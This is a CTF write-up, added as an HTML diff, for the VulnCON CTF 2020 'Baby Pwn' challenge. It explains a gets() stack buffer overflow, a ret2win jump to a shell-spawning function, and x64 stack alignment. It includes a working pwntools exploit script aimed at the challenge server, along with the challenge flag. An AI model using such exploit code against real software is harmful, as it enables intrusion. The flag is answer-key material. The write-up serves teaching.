@@ -1,0 +1,56 @@
+<!--Solve date: 12/19/2020-->
+
+<h1>VulnCON CTF 2020 - Baby Pwn</h1>
+
+<h2>Binary Exploitation - 100 pts</h2>
+
+<h3>Writeup by YR81</h3>
+
+<h4>Discussion</h4>
+
+<h5>Program Behavior</h5>
+
+<p>This program features a very standard stack buffer overflow vulnerability that results from the use of <code>gets()</code>. Recall that <code>gets()</code> reads an unbounded number of characters from standard input, and when the destination is a buffer on the stack, we can hijack program execution by controlling the return address.</p>
+
+<img class = "small" src = "./images/vulncon_babypwn_1.png"/>
+
+<p class = "caption">Figure 1. Disassembly of <code>main()</code> function with the vulnerable call highlighted.</p>
+
+<p>Even better, the program has a function named <code>overflowed()</code> that directly spawns a shell by calling <code>system("/bin/sh")</code> (usually we would have to construct this call ourselves through shellcode or ROP).</p>
+
+<img class = "small" src = "./images/vulncon_babypwn_2.png"/>
+
+<p class = "caption">Figure 2. A convenient function <code>overflowed()</code> that spawns a shell.</p>
+
+<h5>ROP Exploit</h5>
+
+<p>Our payload thus consists of filling up the buffer (in this case, since the buffer is at <code>rbp - 0x10</code>, then we need 16 bytes), overwriting the saved frame pointer (8 bytes in x64), and finally overwriting the return address. Now, we just return to <code>overflowed()</code> and enjoy our shell, right?</p>
+
+<p>There turns out to be a small catch for these types of exploits in x64. If we overwrite the return pointer to point directly to <code>overflowed()</code>, we actually get a segmentation fault! The reason for this is that functions such as <code>printf()</code> and <code>system()</code> expect the stack to be aligned to a 16-byte (paragraph) granularity, since they use the XMM registers for efficient data processing. If we directly return to <code>overflowed()</code>, the stack will not satisfy this alignment, as we can verify with a debugger. To address this small (but important) issue, we can condition the stack by inserting a single <code>ret</code> gadget (i.e., a do-nothing gadget that just returns to the next address). Now, when we enter the call to <code>system()</code>, the stack will be aligned and we get our shell.</p>
+
+<h4>Payload</h4>
+
+<pre class = "python">
+
+from pwn import *
+
+ready = True
+
+if ready:
+    p = process("nc 35.232.11.215 49153", shell = True)
+else:
+    p = process("./babypwn")
+    context.terminal = ["/mnt/c/Users/********/wsl-terminal/open-wsl.exe", '-e']
+    gdb.attach(p)
+
+ret = 0x4011fb      #to align stack
+overflowed = 0x4011fc
+
+p.sendline(0x10 * b'\x01' + p64(0xdeadbeef) + p64(ret) + p64(overflowed))
+
+p.interactive()
+</pre>
+
+<h4>Flag</h4>
+
+<p><code>vulncon{y0u_4re_all_s3t_for_pwn}</code></p>
